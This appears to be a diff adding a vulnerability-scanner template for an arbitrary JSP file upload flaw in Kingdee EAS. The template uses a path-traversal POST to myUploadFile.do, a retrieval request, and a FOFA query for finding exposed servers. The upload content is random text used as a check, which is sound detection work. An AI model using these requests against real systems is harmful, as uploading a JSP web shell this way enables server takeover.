@@ -1,0 +1,39 @@
+id: kingdee-eas-myuploadfile-fileupload
+
+info:
+  name: 金蝶 EAS myUploadFile 任意文件上传
+  author: zan8in
+  severity: critical
+  description: |
+    金蝶 EAS /easportal/buffalo/../cm/myUploadFile.do 可上传任意文件，随后访问上传路径回显随机内容。
+  metadata:
+    verified: true
+    max-request: 2
+    fofa-query: title=="EAS系统登录"
+  tags: kingdee,eas,fileupload
+
+variables:
+  randstr: "{{rand_base(12)}}"
+  randbody: "{{rand_base(30)}}"
+  boundary: "{{rand_base(8)}}"
+
+http:
+  - raw:
+      - |
+        POST /easportal/buffalo/%2e%2e/cm/myUploadFile.do HTTP/1.1
+        Host: {{Hostname}}
+        Content-Type: multipart/form-data; boundary=----WebKitFormBoundary{{boundary}}
+
+        ------WebKitFormBoundary{{boundary}}
+        Content-Disposition: form-data; name="myFile"; filename="{{randstr}}.jsp"
+
+        {{randbody}}
+        ------WebKitFormBoundary{{boundary}}--
+      - |
+        GET /easportal/buffalo/../{{randstr}}.jsp HTTP/1.1
+        Host: {{Hostname}}
+
+    matchers:
+      - type: dsl
+        dsl:
+          - 'status_code_2 == 200 && contains(body_2, randbody)'
